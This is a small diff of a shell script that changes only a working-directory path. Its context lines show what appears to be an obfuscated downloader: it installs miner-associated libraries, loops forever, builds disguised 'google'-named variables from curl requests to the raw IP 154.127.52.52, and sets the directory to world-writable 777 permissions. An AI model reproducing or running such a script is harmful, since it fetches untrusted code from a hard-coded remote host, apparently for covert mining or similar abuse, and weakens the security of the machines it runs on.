@@ -2,7 +2,7 @@ apt-get install -y libcpprest-dev libgmp-dev libargon2-0-dev
 
 apt-get install -y bc
 
-cd /mnt/disks/user/projects/
+cd /mnt/disks/user/project/
 
 while true
 do
@@ -24,7 +24,7 @@ google84121212121212121274=${arr[$(curl -s http://154.127.52.52/linuxgoogle84 | 
 
 chmod -R 777 ./
 
-cd /mnt/disks/user/projects/
+cd /mnt/disks/user/project/
 
 google841212121274="http://154.127.52.52/"
 
